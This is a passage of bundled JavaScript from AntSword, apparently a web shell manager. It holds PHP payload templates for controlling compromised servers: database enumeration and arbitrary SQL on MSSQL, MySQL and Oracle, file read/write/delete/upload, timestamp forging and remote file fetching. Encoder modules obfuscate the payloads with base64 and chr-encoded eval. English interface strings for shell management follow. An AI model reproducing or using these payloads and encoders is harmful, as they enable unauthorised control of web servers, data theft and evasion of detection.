	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$tab=$m?stripslashes($_POST["' + _argv.arg5 + '"]):$_POST["' + _argv.arg5 + '"];$T=@mssql_connect($hst,$usr,$pwd);@mssql_select_db($dbn,$db);$q=@mssql_query("SELECT TOP 1 * FROM {$tab}",$T);while($rs=@mssql_fetch_field($q)){echo(trim($rs->name)." (".$rs->type.")".chr(9));}@mssql_free_result($q);@mssql_close($T);'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{host}'), _defineProperty(_show_columns, _argv.arg2, '#{user}'), _defineProperty(_show_columns, _argv.arg3, '#{passwd}'), _defineProperty(_show_columns, _argv.arg4, '#{db}'), _defineProperty(_show_columns, _argv.arg5, '#{table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$sql=base64_decode($_POST["' + _argv.arg5 + '"]);$T=@mssql_connect($hst,$usr,$pwd);@mssql_select_db($dbn,$db);$q=@mssql_query($sql,$T);$i=0;while($rs=@mssql_fetch_field($q)){echo($rs->name."\t|\t");$i++;}echo("\r\n");while($rs=@mssql_fetch_row($q)){for($c=0;$c<$i;$c++){echo(trim($rs[$c]));echo("\t|\t");}echo("\r\n");}@mssql_free_result($q);@mssql_close($T);'
	  }, _defineProperty(_query, _argv.arg1, '#{host}'), _defineProperty(_query, _argv.arg2, '#{user}'), _defineProperty(_query, _argv.arg3, '#{passwd}'), _defineProperty(_query, _argv.arg4, '#{db}'), _defineProperty(_query, _argv.arg5, '#{base64::sql}'), _query)
	};

/***/ },
/* 63 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_databases, _show_tables, _show_columns, _query;

	var _argv = __webpack_require__(58);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 数据库管理模板::mysql
	//
	// :分隔符为  ->  \t|\t

	module.exports = {
	  // 显示所有数据库
	  show_databases: (_show_databases = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$T=@mysql_connect($hst,$usr,$pwd);$q=@mysql_query("SHOW DATABASES");while($rs=@mysql_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mysql_close($T);'
	  }, _defineProperty(_show_databases, _argv.arg1, '#{host}'), _defineProperty(_show_databases, _argv.arg2, '#{user}'), _defineProperty(_show_databases, _argv.arg3, '#{passwd}'), _show_databases),
	  // 显示数据库所有表
	  show_tables: (_show_tables = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$T=@mysql_connect($hst,$usr,$pwd);$q=@mysql_query("SHOW TABLES FROM `{$dbn}`");while($rs=@mysql_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mysql_close($T);'
	  }, _defineProperty(_show_tables, _argv.arg1, '#{host}'), _defineProperty(_show_tables, _argv.arg2, '#{user}'), _defineProperty(_show_tables, _argv.arg3, '#{passwd}'), _defineProperty(_show_tables, _argv.arg4, '#{db}'), _show_tables),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$tab=$m?stripslashes($_POST["' + _argv.arg5 + '"]):$_POST["' + _argv.arg5 + '"];$T=@mysql_connect($hst,$usr,$pwd);@mysql_select_db($dbn);$q=@mysql_query("SHOW COLUMNS FROM `{$tab}`");while($rs=@mysql_fetch_row($q)){echo(trim($rs[0])." (".$rs[1].")".chr(9));}@mysql_close($T);'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{host}'), _defineProperty(_show_columns, _argv.arg2, '#{user}'), _defineProperty(_show_columns, _argv.arg3, '#{passwd}'), _defineProperty(_show_columns, _argv.arg4, '#{db}'), _defineProperty(_show_columns, _argv.arg5, '#{table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: '$m=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$sql=base64_decode($_POST["' + _argv.arg5 + '"]);$T=@mysql_connect($hst,$usr,$pwd);@mysql_query("SET NAMES ' + _argv.arg6 + '");@mysql_select_db($dbn);$q=@mysql_query($sql);$i=0;while($col=@mysql_field_name($q,$i)){echo($col."\t|\t");$i++;}echo("\r\n");while($rs=@mysql_fetch_row($q)){for($c=0;$c<$i;$c++){echo(trim($rs[$c]));echo("\t|\t");}echo("\r\n");}@mysql_close($T);'
	  }, _defineProperty(_query, _argv.arg1, '#{host}'), _defineProperty(_query, _argv.arg2, '#{user}'), _defineProperty(_query, _argv.arg3, '#{passwd}'), _defineProperty(_query, _argv.arg4, '#{db}'), _defineProperty(_query, _argv.arg5, '#{base64::sql}'), _defineProperty(_query, _argv.arg6, '#{encode}'), _query)
	};

/***/ },
/* 64 */
/***/ function(module, exports, __webpack_require__) {

	'use strict';

	var _show_databases, _show_tables, _show_columns, _query;

	var _argv = __webpack_require__(58);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 数据库管理模板::oracle
	//
	// :分隔符为  ->  \t|\t

	module.exports = {
	  // 显示所有数据库
	  show_databases: (_show_databases = {
	    _: '$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$H=@Ora_Logon("${usr}/${pwd}@${sid}","");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"SELECT USERNAME FROM ALL_USERS ORDER BY 1");if(ora_exec($T)){while(ora_fetch($T)){echo(trim(ora_getcolumn($T,0)).chr(9));}}@ora_close($T);};'
	  }, _defineProperty(_show_databases, _argv.arg1, '#{host}'), _defineProperty(_show_databases, _argv.arg2, '#{user}'), _defineProperty(_show_databases, _argv.arg3, '#{passwd}'), _show_databases),
	  // 显示数据库所有表
	  show_tables: (_show_tables = {
	    _: '$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$H=@ora_plogon("{$usr}@{$sid}","{$pwd}");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"SELECT TABLE_NAME FROM (SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER=\'{$dbn}\' ORDER BY 1)");if(ora_exec($T)){while(ora_fetch($T)){echo(trim(ora_getcolumn($T,0)).chr(9));}}@ora_close($T);};'
	  }, _defineProperty(_show_tables, _argv.arg1, '#{host}'), _defineProperty(_show_tables, _argv.arg2, '#{user}'), _defineProperty(_show_tables, _argv.arg3, '#{passwd}'), _defineProperty(_show_tables, _argv.arg4, '#{db}'), _show_tables),
	  // 显示表字段
	  show_columns: (_show_columns = {
	    _: '$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$tab=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$H=@ora_plogon("{$usr}@{$sid}","{$pwd}");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"SELECT COLUMN_NAME,DATA_TYPE FROM ALL_TAB_COLUMNS WHERE TABLE_NAME=\'{$tab}\' ORDER BY COLUMN_ID");if(ora_exec($T)){while(ora_fetch($T)){echo(trim(ora_getcolumn($T,0))." (".ora_getcolumn($T,1).")".chr(9));}}@ora_close($T);};'
	  }, _defineProperty(_show_columns, _argv.arg1, '#{host}'), _defineProperty(_show_columns, _argv.arg2, '#{user}'), _defineProperty(_show_columns, _argv.arg3, '#{passwd}'), _defineProperty(_show_columns, _argv.arg4, '#{table}'), _show_columns),
	  // 执行SQL语句
	  query: (_query = {
	    _: '$m=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST["' + _argv.arg1 + '"]):$_POST["' + _argv.arg1 + '"];$usr=$m?stripslashes($_POST["' + _argv.arg2 + '"]):$_POST["' + _argv.arg2 + '"];$pwd=$m?stripslashes($_POST["' + _argv.arg3 + '"]):$_POST["' + _argv.arg3 + '"];$dbn=$m?stripslashes($_POST["' + _argv.arg4 + '"]):$_POST["' + _argv.arg4 + '"];$sql=base64_decode($_POST["' + _argv.arg5 + '"]);$H=@ora_plogon("{$usr}@{$sid}","{$pwd}");if(!$H){echo("ERROR:// Login Failed!");}else{$T=@ora_open($H);@ora_commitoff($H);$q=@ora_parse($T,"{$sql}");$R=ora_exec($T);if($R){$n=ora_numcols($T);for($i=0;$i<$n;$i++){echo(Ora_ColumnName($T,$i)."\t|\t");}echo("\r\n");while(ora_fetch($T)){for($i=0;$i<$n;$i++){echo(trim(ora_getcolumn($T,$i)));echo("\t|\t");}echo("\r\n");}}else{echo("ErrMsg\t|\t\r\n");}@ora_close($T);};'
	  }, _defineProperty(_query, _argv.arg1, '#{host}'), _defineProperty(_query, _argv.arg2, '#{user}'), _defineProperty(_query, _argv.arg3, '#{passwd}'), _defineProperty(_query, _argv.arg4, '#{db}'), _defineProperty(_query, _argv.arg5, '#{base64::sql}'), _query)
	};

/***/ },
/* 65 */
/***/ function(module, exports, __webpack_require__) {

	"use strict";

	var _create_file, _copy, _upload_file, _rename, _retime, _wget;

	var _argv = __webpack_require__(58);

	function _defineProperty(obj, key, value) { if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; } //
	// 文件管理模板
	//

	module.exports = {
	  dir: _defineProperty({
	    _: "$D=base64_decode($_POST[\"" + _argv.arg1 + "\"]);$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.\"/\".$N;$T=@date(\"Y-m-d H:i:s\",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=\"\t\".$T.\"\t\".@filesize($P).\"\t\".$E.\"\n\";if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);}"
	  }, _argv.arg1, "#{base64::path}"),

	  delete: _defineProperty({
	    _: "function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p.\"/\".$f;if((is_dir($pf))&&($f!=\".\")&&($f!=\"..\")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);return @rmdir($p);}$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST[\"" + _argv.arg1 + "\"]):$_POST[\"" + _argv.arg1 + "\"]);if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?\"1\":\"0\":\"0\");}"
	  }, _argv.arg1, "#{base64::path}"),

	  create_file: (_create_file = {
	    _: "echo @fwrite(fopen(base64_decode($_POST[\"" + _argv.arg1 + "\"]),\"w\"),base64_decode($_POST[\"" + _argv.arg2 + "\"]))?\"1\":\"0\";"
	  }, _defineProperty(_create_file, _argv.arg1, "#{base64::path}"), _defineProperty(_create_file, _argv.arg2, "#{base64::content}"), _create_file),

	  read_file: _defineProperty({
	    _: "$F=base64_decode($_POST[\"" + _argv.arg1 + "\"]);$P=@fopen($F,\"r\");echo(@fread($P,filesize($F)));@fclose($P);"
	  }, _argv.arg1, "#{base64::path}"),

	  copy: (_copy = {
	    _: "$m=get_magic_quotes_gpc();$fc=base64_decode($m?stripslashes($_POST[\"" + _argv.arg1 + "\"]):$_POST[\"" + _argv.arg1 + "\"]);$fp=base64_decode($m?stripslashes($_POST[\"" + _argv.arg2 + "\"]):$_POST[\"" + _argv.arg2 + "\"]);function xcopy($src,$dest){if(is_file($src)){if(!copy($src,$dest))return false;else return true;}$m=@dir($src);if(!is_dir($dest))if(!@mkdir($dest))return false;while($f=$m->read()){$isrc=$src.chr(47).$f;$idest=$dest.chr(47).$f;if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46).chr(46))){if(!xcopy($isrc,$idest))return false;}else if(is_file($isrc)){if(!copy($isrc,$idest))return false;}}return true;}echo(xcopy($fc,$fp)?\"1\":\"0\");"
	  }, _defineProperty(_copy, _argv.arg1, "#{base64::path}"), _defineProperty(_copy, _argv.arg2, "#{base64::target}"), _copy),

	  download_file: _defineProperty({
	    _: "$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST[\"" + _argv.arg1 + "\"]):$_POST[\"" + _argv.arg1 + "\"]);$fp=@fopen($F,\"r\");if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo(\"ERROR:// Can Not Read\");}"
	  }, _argv.arg1, "#{base64::path}"),

	  upload_file: (_upload_file = {
	    _: "$f=base64_decode($_POST[\"" + _argv.arg1 + "\"]);$c=$_POST[\"" + _argv.arg2 + "\"];$c=str_replace(\"\r\",\"\",$c);$c=str_replace(\"\n\",\"\",$c);$buf=\"\";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode(\"%\".substr($c,$i,2));echo(@fwrite(fopen($f,\"a\"),$buf)?\"1\":\"0\");"
	  }, _defineProperty(_upload_file, _argv.arg1, "#{base64::path}"), _defineProperty(_upload_file, _argv.arg2, "#{buffer::content}"), _upload_file),

	  rename: (_rename = {
	    _: "$m=get_magic_quotes_gpc();$src=base64_decode(m?stripslashes($_POST[\"" + _argv.arg1 + "\"]):$_POST[\"" + _argv.arg1 + "\"]);$dst=base64_decode(m?stripslashes($_POST[\"" + _argv.arg2 + "\"]):$_POST[\"" + _argv.arg2 + "\"]);echo(rename($src,$dst)?\"1\":\"0\");"
	  }, _defineProperty(_rename, _argv.arg1, "#{base64::path}"), _defineProperty(_rename, _argv.arg2, "#{base64::name}"), _rename),

	  retime: (_retime = {
	    _: "$m=get_magic_quotes_gpc();$FN=base64_decode(m?stripslashes($_POST[\"" + _argv.arg1 + "\"]):$_POST[\"" + _argv.arg1 + "\"]);$TM=strtotime(base64_decode(m?stripslashes($_POST[\"" + _argv.arg2 + "\"]):$_POST[\"" + _argv.arg2 + "\"]));if(file_exists($FN)){echo(@touch($FN,$TM,$TM)?\"1\":\"0\");}else{echo(\"0\");};"
	  }, _defineProperty(_retime, _argv.arg1, "#{base64::path}"), _defineProperty(_retime, _argv.arg2, "#{base64::time}"), _retime),

	  mkdir: _defineProperty({
	    _: "$m=get_magic_quotes_gpc();$f=base64_decode($m?stripslashes($_POST[\"" + _argv.arg1 + "\"]):$_POST[\"" + _argv.arg1 + "\"]);echo(mkdir($f)?\"1\":\"0\");"
	  }, _argv.arg1, "#{base64::path}"),

	  wget: (_wget = {
	    _: "$fR=base64_decode($_POST[\"" + _argv.arg1 + "\"]);$fL=base64_decode($_POST[\"" + _argv.arg2 + "\"]);$F=@fopen($fR,chr(114));$L=@fopen($fL,chr(119));if($F && $L){while(!feof($F))@fwrite($L,@fgetc($F));@fclose($F);@fclose($L);echo(\"1\");}else{echo(\"0\");};"
	  }, _defineProperty(_wget, _argv.arg1, "#{base64::url}"), _defineProperty(_wget, _argv.arg2, "#{base64::path}"), _wget)
	};

/***/ },
/* 66 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./base64": 67,
		"./base64.jsx": 67,
		"./chr": 68,
		"./chr.jsx": 68
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 66;


/***/ },
/* 67 */
/***/ function(module, exports, __webpack_require__) {

	/* WEBPACK VAR INJECTION */(function(Buffer) {//
	// php::base64 编码模块
	//
	'use strict';

	module.exports = function (pwd, data) {
	  var randomID = '_0x' + Math.random().toString(16).substr(2);
	  data[randomID] = new Buffer(data['_']).toString('base64');
	  data[pwd] = 'eval(base64_decode($_POST[' + randomID + ']));';
	  delete data['_'];
	  return data;
	};
	/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(5).Buffer))

/***/ },
/* 68 */
/***/ function(module, exports) {

	//
	// encoder::chr
	//
	// chr编码器
	// --------
	// 利用php函数`chr`进行编码处理
	//
	'use strict';

	module.exports = function (pwd, data) {
	  // 编码函数
	  var encode = function encode(php) {
	    var ret = [];
	    var i = 0;
	    while (i < php.length) {
	      ret.push(php[i].charCodeAt());
	      i++;
	    }
	    return 'eVAl(cHr(' + ret.join(').ChR(') + '));';
	  };

	  // 编码并去除多余数据
	  data[pwd] = encode(data._);
	  delete data._;

	  // 返回数据
	  return data;
	};

/***/ },
/* 69 */
/***/ function(module, exports, __webpack_require__) {

	var map = {
		"./en": 70,
		"./en.jsx": 70,
		"./jp": 71,
		"./jp.jsx": 71,
		"./zh": 72,
		"./zh.jsx": 72
	};
	function webpackContext(req) {
		return __webpack_require__(webpackContextResolve(req));
	};
	function webpackContextResolve(req) {
		return map[req] || (function() { throw new Error("Cannot find module '" + req + "'.") }());
	};
	webpackContext.keys = function webpackContextKeys() {
		return Object.keys(map);
	};
	webpackContext.resolve = webpackContextResolve;
	module.exports = webpackContext;
	webpackContext.id = 69;


/***/ },
/* 70 */
/***/ function(module, exports) {

	'use strict';

	//
	// language::en
	//
	module.exports = {
	  toastr: {
	    info: 'Info',
	    error: 'Error',
	    warning: 'Warning',
	    success: 'Success'
	  },
	  menubar: {
	    main: {
	      title: 'AntSword',
	      about: 'About',
	      plugin: 'Plugin center',
	      settings: 'System setting',
	      language: 'Language setting',
	      update: 'Check update',
	      quit: 'Quit'
	    },
	    shell: {
	      title: 'Data',
	      add: 'Add data',
	      search: 'Search data',
	      dump: 'Dump data',
	      import: 'Import data',
	      clear: 'Clear all data'
	    },
	    edit: {
	      title: 'Edit',
	      undo: 'Undo',
	      redo: 'Redo',
	      cut: 'Cut',
	      copy: 'Copy',
	      paste: 'Paste',
	      selectall: 'SelectAll'
	    },
	    window: {
	      title: 'Window',
	      next: 'Next window',
	      prev: 'Prev window',
	      close: 'Close window'
	    }
	  },
	  shellmanager: {
	    title: 'ShellManager',
	    contextmenu: {
	      terminal: 'Terminal',
	      filemanager: 'FileManager',
	      database: 'Database',
	      add: 'Add',
	      edit: 'Edit',
	      delete: 'Delete',
	      move: 'Move',
	      search: 'Search',
	      plugin: 'Plugins',
	      pluginCenter: 'Plugin center',
	      clearCache: 'Clear cache',
	      clearAllCache: 'Clear all cache'
	    },
	    category: {
	      title: 'Category',
	      default: 'Default',
	      toolbar: {
	        add: 'Add',
	        del: 'Del'
	      },
	      add: {
	        title: 'Add category'
	      },
	      del: {
	        title: 'Delete category',
	        confirm: 'Are you sure to delete this category?',
	        success: function success(category) {
	          return 'Delete category(' + category + ') success!';
	        },
	        error: function error(category, err) {
	          return 'Delete category(' + category + 'failed!<br/>' + err;
	        }
	      }
	    },
	    list: {
	      title: 'Shell Lists',
	      grid: {
	        url: 'URL',
	        ip: 'IP',
	        addr: 'ADDR',
	        ctime: 'CTIME',
	        utime: 'UTIME'
	      },
	      add: {
	        title: 'Add shell',
	        toolbar: {
	          add: 'Add',
	          clear: 'Clear'
	        },
	        form: {
	          url: 'Shell url',
	          pwd: 'Shell pwd',
	          encode: 'Encode',
	          type: 'Shell type',
	          encoder: 'Encoder'
	        },
	        warning: 'Please enter the full!',
	        success: 'Add shell success!',
	        error: function error(err) {
	          return 'Add shell failed!<br/>' + err;
	        }
	      },
	      edit: {
	        title: function title(url) {
	          return 'Edit shell(' + url + ')';
	        },
	        toolbar: {
	          save: 'Save',
	          clear: 'Clear'
	        },
	        form: {
	          url: 'Shell url',
	          pwd: 'Shell pwd',
	          encode: 'Encode',
	          type: 'Shell type',
	          encoder: 'Encoder'
	        },
	        warning: 'Please enter the full!',
	        success: 'Update shell success!',
	        error: function error(err) {
	          return 'Update shell failed!<br/>' + err;
	        }
	      },
	      del: {
	        title: 'Delete shell',
	        confirm: function confirm(len) {
	          return 'Are you sure to delete ' + len + ' shells?';
	        },
	        success: function success(len) {
	          return 'Delete ' + len + ' shells success!';
	        },
	        error: function error(err) {
	          return 'Delete failed!<br/>' + err;
	        }
	      },
	      move: {
	        success: function success(num) {
	          return 'Move ' + num + 'datas success!';
	        },
	        error: function error(err) {
	          return 'Move data failed!<br/>' + err;
	        }
	      },
	      clearCache: {
	        title: 'Clear cache',
	        confirm: 'Are you sure to clear this cache?',
	        success: 'Clear cache success!',
	        error: function error(err) {
	          return 'Clear cache failed!<br/>' + err;
	        }
	      },
	      clearAllCache: {
	        title: 'Clear all cache',
	        confirm: 'Are you sure to clear all the cache?',
	        success: 'Clear all cache success!',
	        error: function error(err) {
	          return 'Clear all cache failed!<br/>' + err;
	        }
	      }
	    }
	  },
	  terminal: {
	    title: 'Terminal',
	    banner: {
	      title: 'Infomations',
	      drive: 'Drive   List',
	      system: 'System  Info',
	      user: 'Current User',
	      path: 'Current Path'
	    }
	  },
	  filemanager: {
	    title: 'FileManager',
	    delete: {
	      title: 'Delete',
	      confirm: function confirm(num) {
	        return 'Are you sure to delete ' + (typeof num === 'number' ? num + ' files' : num) + ' ?';
	      },
	      success: function success(path) {
	        return 'Delete file [' + path + '] success!';
	      },
	      error: function error(path, err) {
	        return 'Delete file [' + path + '] failed!' + (err ? '<br/>' + err : '');
	      }
	    },
	    paste: {
	      success: function success(path) {
	        return 'Paste file success!<br/>' + path;
	      },
	      error: function error(path, err) {
	        return 'Paste file [' + path + '] failed!' + (err ? '<br/>' + err : '');
	      }
	    },
	    rename: {
	      title: 'Rename',
	      success: 'Rename success!',
	      error: function error(err) {
	        return 'Rename failed!' + (err ? '<br/>' + err : '');
	      }
	    },
	    createFolder: {
	      title: 'Create Folder',
	      value: 'New Folder',
	      success: function success(path) {
	        return 'Create folder success!<br/>' + path;
	      },
	      error: function error(path, err) {
	        return 'Create folder [' + path + '] failed!' + (err ? '<br/>' + err : '');
	      }
	    },
	    createFile: {
	      title: 'Create File',
	      value: 'New File.txt',
	      success: function success(path) {
	        return 'Create file success!<br/>' + path;
	      },
	      error: function error(path, err) {
	        return 'Create file [' + path + '] failed!' + (err ? '<br/>' + err : '');
	      }
	    },
	    retime: {
	      title: 'Retime File',
	      success: function success(path) {
	        return 'Retime file success!<br/>' + path;
	      },
	      error: function error(path, err) {
	        return 'Retime file [' + path + '] failed!' + (err ? '<br/>' + err : '');
	      }
	    },
	    wget: {
	      title: 'Wget File',
	      check: 'URL is not correct!',
	      task: {
	        name: 'WGET',
	        start: 'Start to wget file..',
	        success: 'Wget success!',
	        failed: function failed(ret) {
	          return 'Failed:' + ret;
	        },
	        error: function error(err) {
	          return 'Error:' + err;
	        }
	      }
	    },
	    upload: {
	      task: {
	        name: 'Upload',
	        failed: function failed(err) {
	          return 'Failed:' + err;
	        },
	        error: function error(err) {
	          return 'Error:' + err;
	        }
	      },
	      success: function success(path) {
	        return 'Upload file success!<br/>' + path;
	      },
	      error: function error(path, err) {
	        return 'Upload file [' + path + '] failed!' + err;
	      }
	    },
	    folder: {
	      title: 'Folders'
	    },
	    files: {
	      title: 'Files',
	      bookmark: {
	        add: 'Add bookmark',
	        del: 'Remove this bookmark',
	        clear: 'Clear all bookmarks'
	      },
	      toolbar: {
	        new: 'New',
	        folder: 'Folder',
	        file: 'File',
	        wget: 'Wget File',
	        upload: 'Upload File',
	        up: 'UP',
	        refresh: 'Refresh',
	        home: 'Home',
	        bookmark: 'Bookmark',
	        read: 'Read'
	      },
	      prompt: {
	        add: {
	          title: 'Add to bookmark',
	          success: function success(path) {
	            return 'Add to bookmark success!<br/>' + path;
	          }
	        },
	        remove: {
	          title: 'Remove bookmark',
	          confirm: 'Remove this bookmark ?',
	          success: 'Remove bookmark success!'
	        },
	        clear: {
	          title: 'Clear all bookmarks',
	          confirm: 'Clear all bookmarks ?',
	          success: 'Clear all bookmark success!'
	        }
	      },
	      grid: {
	        header: {
	          name: 'Name',
	          time: 'Time',
	          size: 'Size',
	          attr: 'Attr'
	        },
	        contextmenu: {
	          paste: {
	            title: 'Paste',
	            all: 'All items',
	            clear: {
	              title: 'Clear items',
	              info: 'Clear all Clipboard.'
	            }
	          },
	          preview: 'Preview',
	          edit: 'Edit',
	          delete: 'Delete',
	          rename: 'Rename',
	          refresh: 'Refresh',
	          wget: 'WGET',
	          upload: 'Upload',
	          download: 'Download',
	          modify: 'Modify the file time',
	          copy: {
	            title: 'Copy',
	            warning: function warning(id) {
	              return 'Already add to clipboard!<br/>' + id;
	            },
	            info: function info(id) {
	              return 'Add file to the clipboard.<br/>' + id;
	            }
	          },
	          create: {
	            title: 'Create',
	            folder: 'Folder',
	            file: 'File'
	          }
	        }
	      }
	    },
	    editor: {
	      title: function title(path) {
	        return 'Edit: ' + path;
	      },
	      toolbar: {
	        save: 'Save',
	        mode: 'Mode',
	        encode: 'Encode'
	      },
	      loadErr: function loadErr(err) {
	        return 'Load file error!<br/>' + err;
	      },
	      success: function success(path) {
	        return 'Save the file success!<br/>' + path;
	      },
	      error: function error(path, err) {
	        return 'Save the file [' + path + '] failed!' + err;
	      }
	    },
	    tasks: {
	      title: 'Tasks',
	      grid: {
	        header: {
	          name: 'Name',
	          desc: 'Description',
	          status: 'Status',
	          stime: 'StartTime',
	          etime: 'EndTime'
	        }
	      }
	    },
	    download: {
	      title: 'Download File',
	      task: {
	        name: 'Download',
	        wait: 'Wait to download',
	        cancel: 'Cancel download',
	        start: 'Start to download',
	        success: 'Download success!',
	        error: function error(err) {
	          return 'Error:' + err;
	        }
	      },
	      error: function error(name, err) {
	        return 'Download file [' + name + ']error!<br/>' + err;
	      },
	      success: function success(name) {
	        return 'Download file [' + name + '] success!';
	      }
	    }
	  },
	  database: {
	    list: {
	      title: 'Config list',
	      add: 'Add',
	      del: 'Del',
	      menu: {
	        add: 'Add conf',
	        del: 'Del conf'
	      }
	    },
	    query: {
	      title: 'Exec SQL',
	      exec: 'Run',
	      clear: 'Clear'
	    },
	    result: {
	      title: 'Result',
	      warning: 'Execution is completed, but no results return!',
	      error: {
	        database: function database(err) {
	          return 'Failed to obtain a list of databases!<br/>' + err;
	        },
	        table: function table(err) {
	          return 'Get table data failed!<br/>' + err;
	        },
	        column: function column(err) {
	          return 'Failed to obtain field list!<br/>' + err;
	        },
	        query: function query(err) {
	          return 'Failure to execute SQL!<br/>' + err;
	        },
	        parse: 'Return data format is incorrect!',
	        noresult: 'No query results!'
	      }
	    },
	    form: {
	      title: 'Add conf',
	      toolbar: {
	        add: 'Add',
	        clear: 'Clear'
	      },
	      type: 'Database type',
	      encode: 'Database encode',
	      host: 'Host',
	      user: 'User',
	      passwd: 'Password',
	      warning: 'Please fill in the complete!',
	      success: 'Successful add configuration!',
	      del: {
	        title: 'Delete configuration',
	        confirm: 'Determine delete this configuration?',
	        success: 'Delete configuration success!',
